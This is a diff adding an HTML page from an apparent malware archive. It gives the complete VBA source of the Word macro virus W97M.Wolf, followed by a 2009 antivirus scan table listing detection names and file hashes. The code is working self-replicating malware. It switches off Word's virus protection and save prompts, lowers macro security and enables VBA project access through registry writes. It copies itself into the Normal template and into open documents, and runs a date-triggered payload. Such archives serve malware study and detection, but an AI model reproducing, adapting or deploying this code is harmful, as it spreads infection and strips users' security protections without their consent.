@@ -1,0 +1,122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20020225 - W97M.Wolf</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : W97M.Wolf
+' Author : PetiK
+' Language : VBA Word
+' Date : 25/02/2002
+</span><span class="sc0">
+</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Wolf"</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoOpen</span><span class="sc6">()</span><span class="sc0">
+    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndProtect</span><span class="sc0">
+    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Infection</span><span class="sc0">
+    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SearchF</span><span class="sc0">
+    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Payload</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">HelpAbout</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Application.Assistant</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Very Thanx to Tex Avery. hahahahaha"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbInformation</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M.Wolf.A"</span><span class="sc0">
+</span><span class="sc7">Application.UserName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"My Name is Wolf"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoClose</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Dialogs</span><span class="sc6">(</span><span class="sc7">wdDialogFileSummaryInfo</span><span class="sc6">)</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Author</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Wolf"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Title</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"My Friend the Wolf"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Tex Avery and the other"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Keywords</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Wolf, Tex Avery, Ed Love, Droopy"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Comments</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"No comments"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Execute</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">ActiveDocument.Name</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Document"</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">ActiveDocument.Saved</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">ActiveDocument.Save</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Infection</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Nor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NormalTemplate.VBProject.VBComponents</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Doc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ActiveDocument.VBProject.VBComponents</span><span class="sc0">
+</span><span class="sc7">DropFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\Wolf.sys"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Nor.Item</span><span class="sc6">(</span><span class="sc4">"Wolf"</span><span class="sc6">).</span><span class="sc7">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Wolf"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+    </span><span class="sc7">Doc</span><span class="sc6">(</span><span class="sc4">"Wolf"</span><span class="sc6">).</span><span class="sc10">Export</span><span class="sc0"> </span><span class="sc7">DropFile</span><span class="sc0">
+    </span><span class="sc7">Nor.Import</span><span class="sc0"> </span><span class="sc7">DropFile</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Doc.Item</span><span class="sc6">(</span><span class="sc4">"Wolf"</span><span class="sc6">).</span><span class="sc7">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Wolf"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+    </span><span class="sc7">Nor</span><span class="sc6">(</span><span class="sc4">"Wolf"</span><span class="sc6">).</span><span class="sc10">Export</span><span class="sc0"> </span><span class="sc7">DropFile</span><span class="sc0">
+    </span><span class="sc7">Doc.Import</span><span class="sc0"> </span><span class="sc7">DropFile</span><span class="sc0">
+    </span><span class="sc7">ActiveDocument.Save</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SearchF</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Application.FileSearch</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">FileName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"*.doc"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">LookIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">SearchSubFolders</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">FileType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoFileTypeWordDocuments</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Execute</span><span class="sc0">
+    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">I</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc6">.</span><span class="sc7">FoundFiles.Count</span><span class="sc0">
+        </span><span class="sc7">FileSystem.SetAttr</span><span class="sc0"> </span><span class="sc6">.</span><span class="sc7">FoundFiles</span><span class="sc6">(</span><span class="sc7">I</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">vbNormal</span><span class="sc0">
+    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">I</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EndProtect</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Options</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">ConfirmConversions</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">VirusProtection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">SaveNormalPrompt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">Application.Version</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"10.0"</span><span class="sc0">
+    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
+    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AccessVBOM"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"9.0"</span><span class="sc0">
+    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
+</span><span class="sc7">WordBasic.DisableAutoMacros</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Payload</span><span class="sc6">()</span><span class="sc0">
+    </span><span class="sc7">MyApp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc4">"notepad.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+    </span><span class="sc7">SendKeys</span><span class="sc0"> </span><span class="sc4">"This is my last Word97Macro virus."</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+    </span><span class="sc7">AppActivate</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">MyApp</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span>
+<span class="sc0"><table border="1"><tr><td colspan="4">File Wolf.doc received on 2009.06.10 04:41:24 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">Virus.MSWord.Droopy.A!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td style="color: red;">W97M/Droopy.B</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">W2000M/Droopy.A</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Virus/MSWord.Droopy</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">W97M/Droopy.A</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">MW97:Droopy family</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">W97M/Beko</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">W97M.Droopy.A</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">a variant of virus W97M.Inadd</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td style="color: red;">WM.Pivis</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Virus.MSWord.Droopy</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">W97M.Droopy</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">W97M.Wolf.A</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">W97M/Droopy.A</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">W97M/Droopy.A</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Virus.MSWord.Droopy</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">W97M/Droopy.A</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">W97M.Droopy.A</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td style="color: red;">Macro.Droopy</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Virus.MSWord.Droopy</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W97M/Generic</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W97M/Generic</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Macro.Droopy.A</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Virus:W97M/Droopy.A</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">W97M/Droopy.A</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">W97M/Droopy.A</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">W97M.Droopy.A</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">W97M/CokeBoy</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">WORD.97.Flow.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Macro.Word97.Wolf.a</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">WM97/Droopy-A</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td style="color: red;">W97M.Droopy (v)</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">W97M.Droopy.A</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td style="color: red;">W2KM/Generico</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">W97M_Generic</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">Virus.MSWord.Droopy</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td style="color: red;">W97M.Droopy.A</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">WORD.97.Flow.A</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 40960 bytes</td></tr><tr><td colspan="4">MD5...: 456d71a02c519c6a1f13fa9ffc899f2e</td></tr><tr><td colspan="4">SHA1..: 534f5ae68f8634c6c69a5b40ad131a4bf674d000</td></tr><tr><td colspan="4">SHA256: ac9feaf6626f186bd557eb90c494a7b596420954d9d41c61219310ef6e109f62</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Microsoft Word document (80.0%)<br>Generic OLE2 / Multistream Compound File (20.0%)</td></tr><tr><td colspan="4">PEInfo: -</td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr></table></span>
+</div></body>
+</html>
